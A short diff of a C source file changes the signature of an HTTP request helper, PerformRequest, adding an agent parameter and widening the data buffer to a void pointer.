@@ -1,6 +1,6 @@
 #include "Http.h"
 
-HANDLE PerformRequest(LPCWSTR UserAgent, LPCWSTR HttpEndpoint, LPCWSTR pswzServerName, LPCWSTR DataBuff, DWORD dwDataLen, LPCWSTR pswzRequestHeaders) {
+HANDLE PerformRequest(pAgent agent, LPCWSTR UserAgent, LPCWSTR HttpEndpoint, LPCWSTR pswzServerName, LPVOID DataBuff, DWORD dwDataLen, LPCWSTR pswzRequestHeaders) {
 	HANDLE hConnect;
 	HANDLE hRequest;
 	
